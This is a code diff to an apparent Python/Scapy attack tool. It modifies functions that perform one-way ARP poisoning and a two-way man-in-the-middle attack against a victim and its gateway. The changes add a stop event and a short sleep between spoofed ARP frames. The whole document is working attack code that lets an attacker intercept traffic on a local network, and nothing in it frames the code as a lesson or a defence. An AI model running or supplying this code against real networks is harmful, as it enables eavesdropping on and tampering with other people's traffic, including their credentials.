@@ -1,5 +1,5 @@
 from scapy.all import *
-from setup import *
+from time import sleep
 
 def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface):
     arp = Ether() / ARP()
@@ -11,7 +11,7 @@ def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface):
 
     sendp(arp, iface = interface, verbose=False)
     
-def oneWayPoisoning(a,interface):
+def oneWayPoisoning(a,interface,live):
    
     print("\none-way ARP poisoning\n")
 
@@ -20,10 +20,11 @@ def oneWayPoisoning(a,interface):
     ipV = a["victim IP"]
     ipG = a["gateway IP"]
 
-    while True:
+    while not live.is_set():
         arpPoison(hwA, hwV, ipV, ipG, interface)
+        sleep(0.1)
     
-def mimAttack(a,interface):
+def mimAttack(a,interface,live):
 
     print("\nMITM attack using ARP poisoning\n")
 
@@ -33,6 +34,7 @@ def mimAttack(a,interface):
     ipV = a["victim IP"]
     ipG = a["gateway IP"]
 
-    while True:
+    while not live.is_set():
         arpPoison(hwA, hwV, ipV, ipG, interface)
         arpPoison(hwA, hwG, ipG, ipV, interface)
+        sleep(0.1)
